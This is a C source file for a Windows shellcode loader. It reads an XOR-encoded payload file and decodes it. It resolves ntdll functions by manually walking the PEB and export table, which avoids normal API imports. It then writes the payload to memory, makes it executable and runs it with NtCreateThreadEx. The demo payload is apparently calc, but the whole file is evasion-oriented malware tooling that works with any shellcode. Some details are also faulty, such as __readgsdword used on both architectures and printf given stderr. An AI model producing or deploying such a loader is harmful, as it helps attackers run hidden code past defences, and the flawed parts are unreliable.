#include <stdio.h>
#include <stdlib.h>
#include <windows.h>



typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    SHORT LoadCount;
    SHORT TlsIndex;
    LIST_ENTRY HashLinks;
    PVOID SectionPointer;
    ULONG CheckSum;
    ULONG TimeDateStamp;
    PVOID LoadedImports;
    PVOID EntryPointActivationContext;
    PVOID PatchInformation;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA
{
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID EntryInProgress;
    BOOLEAN ShutdownInProgress;
    HANDLE ShutdownThreadId;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB {
    UCHAR InheritedAddressSpace;
    UCHAR ReadImageFileExecOptions;
    UCHAR BeingDebugged;
    UCHAR Spare;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;

#ifdef _WIN64
#define PEB_OFFSET 0x60
#else
#define PEB_OFFSET 0x30
#endif

HMODULE MyCustomModuleHandle(const char *moduleName) {
    PPEB peb = (PPEB)__readgsdword(PEB_OFFSET);
    PPEB_LDR_DATA ldr = peb->Ldr;
    PLIST_ENTRY moduleList = &ldr->InLoadOrderModuleList;
    PLIST_ENTRY currentEntry = moduleList->Flink;

    while (currentEntry != moduleList) {
        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(currentEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        char baseDllName[MAX_PATH];

        // Convert UNICODE_STRING BaseDllName to ANSI string
        wcstombs(baseDllName, entry->BaseDllName.Buffer, entry->BaseDllName.Length / sizeof(WCHAR));
        baseDllName[entry->BaseDllName.Length / sizeof(WCHAR)] = '\0';

        if (_stricmp(baseDllName, moduleName) == 0) {
            return (HMODULE)entry->DllBase;
        }

        currentEntry = currentEntry->Flink;
    }

    return NULL;
}
void* RVA_to_Addr(PIMAGE_NT_HEADERS ntHeaders, DWORD rva, HMODULE hModule) {
    return (void*)((BYTE*)hModule + rva);
}

// Custom GetProcAddress implementation
FARPROC MyCustomGetProcAddress(HMODULE hModule, const char* funcName) {
    if (!hModule || !funcName) return NULL;

    // Step 1: Get DOS Header
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    // Step 2: Get NT Headers
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;

    // Step 3: Get the Export Directory
    DWORD exportDirRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exportDirRVA == 0) return NULL;

    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)RVA_to_Addr(ntHeaders, exportDirRVA, hModule);

    // Step 4: Get the arrays of function names, ordinals, and addresses
    DWORD* nameRVAArray = (DWORD*)RVA_to_Addr(ntHeaders, exportDir->AddressOfNames, hModule);
    WORD* ordinalArray = (WORD*)RVA_to_Addr(ntHeaders, exportDir->AddressOfNameOrdinals, hModule);
    DWORD* functionRVAArray = (DWORD*)RVA_to_Addr(ntHeaders, exportDir->AddressOfFunctions, hModule);

    // Step 5: Iterate over the names to find the desired function
    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        const char* currentFuncName = (const char*)RVA_to_Addr(ntHeaders, nameRVAArray[i], hModule);
        if (strcmp(currentFuncName, funcName) == 0) {
            // Function name matches
            WORD ordinal = ordinalArray[i];
            DWORD functionRVA = functionRVAArray[ordinal];
            return (FARPROC)RVA_to_Addr(ntHeaders, functionRVA, hModule);
        }
    }

    // Function not found
    return NULL;
}
typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *NtFreeVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG FreeType
);

typedef NTSTATUS (NTAPI *PUSER_THREAD_START_ROUTINE)(
    _In_ PVOID ThreadParameter
    );

typedef struct _PS_ATTRIBUTE
{
    ULONG_PTR Attribute;
    SIZE_T Size;
    union
    {
        ULONG_PTR Value;
        PVOID ValuePtr;
    };
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;
typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

typedef NTSTATUS(NTAPI *NtClose_t)(
   HANDLE Handle
);
typedef struct _OBJECT_ATTRIBUTES
{
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor; // PSECURITY_DESCRIPTOR;
    PVOID SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
typedef NTSTATUS (NTAPI *NtCreateThreadEx_t)(
    _Out_ PHANDLE ThreadHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE ProcessHandle,
    _In_ PUSER_THREAD_START_ROUTINE StartRoutine,
    _In_opt_ PVOID Argument,
    _In_ ULONG CreateFlags, 
    _In_ SIZE_T ZeroBits,
    _In_ SIZE_T StackSize,
    _In_ SIZE_T MaximumStackSize,
    _In_opt_ PPS_ATTRIBUTE_LIST AttributeList
);

void read(const char *filename, char **buffer, int *fileLen) {
    FILE *file = fopen(filename, "rb");
    if (file == NULL) {
        fprintf(stderr, "Could not open file %s\n", filename);
        exit(1);
    }

    fseek(file, 0, SEEK_END);
    *fileLen = ftell(file);
    fseek(file, 0, SEEK_SET);

    *buffer = (char *)malloc(*fileLen);
    if (*buffer == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        fclose(file);
        exit(1);
    }

    fread(*buffer, 1, *fileLen, file);
    fclose(file);
}

void xor(char *buffer, int fileLen) {
    for (int i = 0; i < fileLen; i++) {
        buffer[i] ^= 1;
    }
}

int main() {
    char *buffer;
    int fileLen;
    DWORD oldProtect;

    read("calc_xored.bin", &buffer, &fileLen);

    printf("File contents:\n");
    for (int i = 0; i < fileLen; i++) {
        printf("%02x ", (unsigned char)buffer[i]);
    }
    printf("\n");

    xor(buffer, fileLen);

    printf("File content after unXORing:\n");
    for (int i = 0; i < fileLen; i++) {
        printf("%02x ", (unsigned char)buffer[i]);
    }
    printf("\n");
    HMODULE hNtdll = MyCustomModuleHandle("ntdll.dll");
    if (!hNtdll) {
        printf(stderr, "Error loading ntdll.dll\n");
        free(buffer);
        return EXIT_FAILURE;
    }

    NtAllocateVirtualMemory_t NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)MyCustomGetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    NtProtectVirtualMemory_t NtProtectVirtualMemory = (NtProtectVirtualMemory_t)MyCustomGetProcAddress(hNtdll, "NtProtectVirtualMemory");
    NtFreeVirtualMemory_t NtFreeVirtualMemory = (NtFreeVirtualMemory_t)MyCustomGetProcAddress(hNtdll, "NtFreeVirtualMemory");
    NtCreateThreadEx_t NtCreateThreadEx = (NtCreateThreadEx_t)MyCustomGetProcAddress(hNtdll, "NtCreateThreadEx");
    NtClose_t NtClose = (NtClose_t)MyCustomGetProcAddress(hNtdll, "NtClose");
    if (!NtAllocateVirtualMemory || !NtProtectVirtualMemory || !NtFreeVirtualMemory || !NtCreateThreadEx) {
        printf(stderr, "Error getting function addresses\n");
        free(buffer);
        return EXIT_FAILURE;
    }

    PVOID exec = NULL;
    SIZE_T size = fileLen;
    NTSTATUS status = NtAllocateVirtualMemory(GetCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status < 0) {
        printf(stderr, "Error allocating memory: 0x%x\n", status);
        free(buffer);
        return EXIT_FAILURE;
    }

    memcpy(exec, buffer, fileLen);

    status = NtProtectVirtualMemory(GetCurrentProcess(), &exec, &size, PAGE_EXECUTE_READ, &oldProtect);
    if (status < 0) {
        printf(stderr, "Error changing memory protection: 0x%x\n", status);
        NtFreeVirtualMemory(GetCurrentProcess(), &exec, &size, MEM_RELEASE);
        free(buffer);
        return EXIT_FAILURE;
    }

    HANDLE threadHandle = NULL;
    status = NtCreateThreadEx(&threadHandle, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), (PUSER_THREAD_START_ROUTINE)exec, NULL, 0, 0, 0, 0, NULL);
    if (status < 0) {
        printf(stderr, "Error creating thread: 0x%x\n", status);
        NtFreeVirtualMemory(GetCurrentProcess(), &exec, &size, MEM_RELEASE);
        free(buffer);
        return EXIT_FAILURE;
    }

    WaitForSingleObject(threadHandle, INFINITE);
    NtClose(threadHandle);

    NtFreeVirtualMemory(GetCurrentProcess(), &exec, &size, MEM_RELEASE);
    free(buffer);

    return 0;
}
